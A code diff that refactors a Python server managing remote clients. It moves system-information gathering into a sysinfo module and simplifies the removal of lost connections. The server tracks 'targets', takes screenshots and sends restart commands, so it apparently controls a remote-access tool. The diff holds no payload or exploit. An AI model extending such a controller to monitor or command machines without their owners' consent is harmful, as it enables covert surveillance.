@@ -15,9 +15,10 @@ import validation
 import screenshot
 import connectedstations
 import tasks
+import sysinfo
 
 
-# TODO: Create a system specs function.
+# TODO: Break to modules.
 
 init()
 
@@ -327,18 +328,7 @@ class Server:
             try:
                 con.send('restart'.encode())
                 try:
-                    for conKey, ipValue in self.clients.items():
-                        for ipKey, identValue in ipValue.items():
-                            for identKey, userValue in identValue.items():
-                                self.targets.remove(con)
-                                self.ips.remove(ip)
-
-                                del self.connections[con]
-                                del self.clients[con]
-                                print(f"[{colored('*', 'red')}]({colored(f'{ip}', 'red')} | "
-                                      f"{colored(f'{identKey}', 'red')} | "
-                                      f"{colored(f'{userValue}', 'red')}) "
-                                      f"has been removed from the availables list.")
+                    self.remove_lost_connection(con, ip)
                     return False
 
                 except RuntimeError:
@@ -349,12 +339,8 @@ class Server:
                 self.remove_lost_connection(con, ip)
 
         return
-        # else:
-        #     return False
 
     def bytes_to_number(self, b):
-        # if Python2.x
-        # b = map(ord, b)
         res = 0
         for i in range(4):
             res += b[i] << (i * 8)
@@ -474,7 +460,8 @@ class Server:
                     break
 
                 try:
-                    self.system_information(con)
+                    sysinfo.system_information(con, self.ttl)
+                    # self.system_information(con)
 
                 except ConnectionResetError:
                     print(f"[{colored('!', 'red')}]Client lost connection.")
@@ -601,7 +588,6 @@ class Server:
 
             # Restart
             elif int(cmd) == 6:
-
                 self.restart(con, ip)
                 return
 
